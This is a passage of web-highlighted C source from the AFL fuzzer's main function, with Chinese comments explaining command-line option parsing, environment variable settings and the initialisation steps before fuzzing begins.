class="token punctuation">.</span>tv_sec <span class="token operator">^</span> tv<span class="token punctuation">.</span>tv_usec <span class="token operator">^</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"+i:o:f:m:t:T:dnCB:S:M:x:Q"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//使用 getopt 解析命令行参数，例如 afl-fuzz -i fuzz_in -o fuzz_out ./afl_test -M fuzzer1</span>    <span class="token comment">//:表示该选项需要一个参数，getopt 会返回解析到的选项字符，如果没有更多选项，则返回 -1。</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token char">'i'</span><span class="token operator">:</span> <span class="token comment">/* input dir */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>in_dir<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -i options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//已经指定过输入目录则报错</span>        in_dir <span class="token operator">=</span> optarg<span class="token punctuation">;</span><span class="token comment">//指定输入目录</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>in_dir<span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> in_place_resume <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//输入目录为 "-"，表示从当前目录恢复测试（in_place_resume）</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">case</span> <span class="token char">'o'</span><span class="token operator">:</span> <span class="token comment">/* output dir */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>out_dir<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -o options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out_dir <span class="token operator">=</span> optarg<span class="token punctuation">;</span><span class="token comment">//设置输出目录</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'M'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">//主节点同步 ID</span>          u8<span class="token operator">*</span> c<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -S or -M options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          sync_id <span class="token operator">=</span> <span class="token function">ck_strdup</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Synchronization 同步</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>sync_id<span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//格式示例：sync1:1/3，master_id = 1,master_max=3（主节点同步 ID 的最大值）</span>            <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"%u/%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>master_id<span class="token punctuation">,</span> <span class="token operator">&amp;</span>master_max<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span> <span class="token operator">||</span>                <span class="token operator">!</span>master_id <span class="token operator">||</span> <span class="token operator">!</span>master_max <span class="token operator">||</span> master_id <span class="token operator">></span> master_max <span class="token operator">||</span>                master_max <span class="token operator">></span> <span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Bogus master ID passed to -M"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          force_deterministic <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'S'</span><span class="token operator">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -S or -M options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sync_id <span class="token operator">=</span> <span class="token function">ck_strdup</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指定从属模块的同步 ID</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'f'</span><span class="token operator">:</span> <span class="token comment">/* target file */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>out_file<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -f options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out_file <span class="token operator">=</span> optarg<span class="token punctuation">;</span><span class="token comment">//指定目标程序的输入文件</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'x'</span><span class="token operator">:</span> <span class="token comment">/* dictionary */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>extras_dir<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -x options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        extras_dir <span class="token operator">=</span> optarg<span class="token punctuation">;</span><span class="token comment">//指定字典文件，用于指导模糊测试</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'t'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* timeout */</span>          u8 suffix <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>timeout_given<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -t options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>optarg<span class="token punctuation">,</span> <span class="token string">"%u%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exec_tmout<span class="token punctuation">,</span> <span class="token operator">&amp;</span>suffix<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span><span class="token comment">//设置目标程序的超时时间（单位为毫秒），不小于5ms</span>              optarg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Bad syntax used for -t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>exec_tmout <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Dangerously low value of -t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">==</span> <span class="token char">'+'</span><span class="token punctuation">)</span> timeout_given <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token keyword">else</span> timeout_given <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//可以带后缀 +，表示动态超时</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">case</span> <span class="token char">'m'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* mem limit */</span>          u8 suffix <span class="token operator">=</span> <span class="token char">'M'</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit_given<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -m options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          mem_limit_given <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//有内存限制则设置 mem_limit_given 为 1</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>optarg<span class="token punctuation">,</span> <span class="token string">"none"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            mem_limit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>optarg<span class="token punctuation">,</span> <span class="token string">"%llu%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mem_limit<span class="token punctuation">,</span> <span class="token operator">&amp;</span>suffix<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span>              optarg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Bad syntax used for -m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">switch</span> <span class="token punctuation">(</span>suffix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//设置目标程序的内存限制，可以带后缀 T / G / k / M，不小于5m，32位系统不大于2000m</span>            <span class="token keyword">case</span> <span class="token char">'T'</span><span class="token operator">:</span> mem_limit <span class="token operator">*=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'G'</span><span class="token operator">:</span> mem_limit <span class="token operator">*=</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'k'</span><span class="token operator">:</span> mem_limit <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'M'</span><span class="token operator">:</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unsupported suffix or bad syntax for -m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Dangerously low value of -m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">rlim_t</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> mem_limit <span class="token operator">></span> <span class="token number">2000</span><span class="token punctuation">)</span>            <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Value of -m out of range on 32-bit systems"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span> <span class="token comment">/* skip deterministic */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>skip_deterministic<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -d options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        skip_deterministic <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//跳过 AFL 的确定性变异阶段，直接进入随机变异阶段</span>        use_splicing <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'B'</span><span class="token operator">:</span> <span class="token comment">/* load bitmap */</span>        <span class="token comment">//源码注释翻译：</span>        <span class="token comment">//这是一个秘密的未记录选项！如果您在正常模糊测试过程中发现一个有趣的测试用例，并且想要对其进行变异而不重新发现在之前运行中已经发现的任何测试用例，则它很有用。</span><span class="token comment">//要使用此模式，您需要将 -B 指向之前运行为完全相同的二进制文件生成的 fuzz_bitmap...</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>in_bitmap<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -B options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        in_bitmap <span class="token operator">=</span> optarg<span class="token punctuation">;</span>        <span class="token function">read_bitmap</span><span class="token punctuation">(</span>in_bitmap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加载之前运行生成的位图文件，用于跳过已发现的路径</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'C'</span><span class="token operator">:</span> <span class="token comment">/* crash mode */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>crash_mode<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -C options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        crash_mode <span class="token operator">=</span> FAULT_CRASH<span class="token punctuation">;</span><span class="token comment">//启用崩溃模式，AFL 只记录导致崩溃的测试用例</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'n'</span><span class="token operator">:</span> <span class="token comment">/* dumb mode */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -n options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_DUMB_FORKSRV"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> dumb_mode <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token keyword">else</span> dumb_mode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//启用简单模式，AFL 不使用复杂的变异策略</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'T'</span><span class="token operator">:</span> <span class="token comment">/* banner */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>use_banner<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -T options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        use_banner <span class="token operator">=</span> optarg<span class="token punctuation">;</span><span class="token comment">//设置 AFL 的 banner 信息</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token char">'Q'</span><span class="token operator">:</span> <span class="token comment">/* QEMU mode */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>qemu_mode<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Multiple -Q options not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        qemu_mode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//启用 QEMU 模式，用于测试非原生二进制文件</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mem_limit_given<span class="token punctuation">)</span> mem_limit <span class="token operator">=</span> MEM_LIMIT_QEMU<span class="token punctuation">;</span><span class="token comment">//如果未设置内存限制，则默认为 QEMU 模式的内存限制</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用 usage 函数显示帮助信息并退出</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>optind <span class="token operator">==</span> argc <span class="token operator">||</span> <span class="token operator">!</span>in_dir <span class="token operator">||</span> <span class="token operator">!</span>out_dir<span class="token punctuation">)</span> <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查是否提供了必要的参数（输入目录和输出目录），没有就调用 usage 函数显示帮助信息并退出</span>  <span class="token function">setup_signal_handlers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注册信号处理函数</span>  <span class="token function">check_asan_opts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读取ASAN_OPTIONS和MSAN_OPTIONS，进行一些检查</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span> <span class="token function">fix_up_sync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指定了sync_id就进行一些设置</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>in_dir<span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//限制输入文件夹和输出文件夹不能是同一个文件夹</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Input and output directories can't be the same"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//开启了简单模式</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>crash_mode<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"-C and -n are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同时开启崩溃模式就报错</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>qemu_mode<span class="token punctuation">)</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"-Q and -n are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同时开启qemu模式就报错</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//处理环境变量</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_NO_FORKSRV"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    no_forkserver    <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_NO_CPU_RED"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    no_cpu_meter_red <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//关闭 CPU 使用率的红色显示</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_NO_ARITH"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      no_arith         <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//禁用算术运算变异</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_SHUFFLE_QUEUE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> shuffle_queue    <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//启用队列洗牌功能</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_FAST_CAL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      fast_cal         <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//启用快速校准模式，calibrate_case 函数只运行 3 次程序而不是原来默认的 8 次</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HANG_TMOUT"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//挂起超时时间</span>    hang_tmout <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HANG_TMOUT"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hang_tmout<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Invalid value of AFL_HANG_TMOUT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//是0就报错</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> no_forkserver<span class="token punctuation">)</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//在 Linux 和 macOS 下预加载用户指定的库</span>    <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"DYLD_INSERT_LIBRARIES"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果使用了已废弃的环境变量 AFL_LD_PRELOAD，则提示用户改用 AFL_PRELOAD</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Use AFL_PRELOAD instead of AFL_LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">save_cmdline</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存命令行参数，在保存崩溃信息的时候使用</span>  <span class="token function">fix_up_banner</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>optind<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新 use_banner</span>  <span class="token function">check_if_tty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据环境变量 AFL_NO_UI 设置 not_on_tty 进而确定是界面显示还是逐行输出</span>  <span class="token comment">//cpu操作</span>  <span class="token function">get_core_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取核心数量</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">HAVE_AFFINITY</span></span>  <span class="token function">bind_to_free_cpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绑定到一个空闲的 CPU，有助于提升多线程或多进程的性能</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* HAVE_AFFINITY */</span></span>  <span class="token function">check_crash_handling</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//crash的进程报告被发送给某个程序会导致延迟，crash可能被认为是超时，函数用于检查这种情况并且提醒用户</span>  <span class="token function">check_cpu_governor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 若发现 cpu 频率可调，则建议用户把 cpu 定在最高频率</span>  <span class="token function">setup_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 若指定了环境变量 AFL_POST_LIBRARY，则设置 post_handler 为 lib 中的 afl_postprocess 函数</span>  <span class="token function">setup_shm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化共享内存</span>  <span class="token function">init_count_class16</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化 16bit 查找表</span>  <span class="token comment">//文件操作</span>  <span class="token function">setup_dirs_fds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在工作目录下创建一些文件夹，并打开一些 fd 备用，例如 /dev/urandom</span>  <span class="token function">read_testcases</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 把初始 corpus 读入 queue</span>  <span class="token function">load_auto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 读入自动生成的 extra</span>  <span class="token function">pivot_inputs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 把初始 corpus 复制到工作目录的 queue 文件夹下</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>extras_dir<span class="token punctuation">)</span> <span class="token function">load_extras</span><span class="token punctuation">(</span>extras_dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用户通过 -x 指定了 dictionary，则从那里导入 extra</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>timeout_given<span class="token punctuation">)</span> <span class="token function">find_timeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 若是 in-place resume（通过 "-i -" 选项指定），则继承上次 fuzz 的 exec_timeout</span>  <span class="token function">detect_file_args</span><span class="token punctuation">(</span>argv <span class="token operator">+</span> optind <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断目标程序，对文件名为 @@ 的情况进行特判</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>out_file<span class="token punctuation">)</span> <span class="token function">setup_stdio_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建 .cur_input 文件并打开，设为 out_fd。接下来 fuzzer 要把变异出的 input 写进这里，由 child 读取</span>  <span class="token function">check_binary</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>optind<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查目标程序</span>  start_time <span class="token operator">=</span> <span class="token function">get_cur_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取开始时间</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>qemu_mode<span class="token punctuation">)</span>    use_argv <span class="token operator">=</span> <span class="token function">get_qemu_argv</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv <span class="token operator">+</span> optind<span class="token punctuation">,</span> argc <span class="token operator">-</span> optind<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取 qemu 模式使用的参数</span>  <span class="token keyword">else</span>    use_argv <span class="token operator">=</span> argv <span class="token operator">+</span> optind<span class="token punctuation">;</span>  <span class="token function">perform_dry_run</span><span class="token punctuation">(</span>use_argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行输入文件夹中预先准备的所有测试用例，以确认目标程序是否按预期工作，只在初始输入时执行一次</span>  <span class="token function">cull_queue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//精简队列</span>  <span class="token function">show_init_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 更新ui信息，使用ui界面展示</span>  seek_to <span class="token operator">=</span> 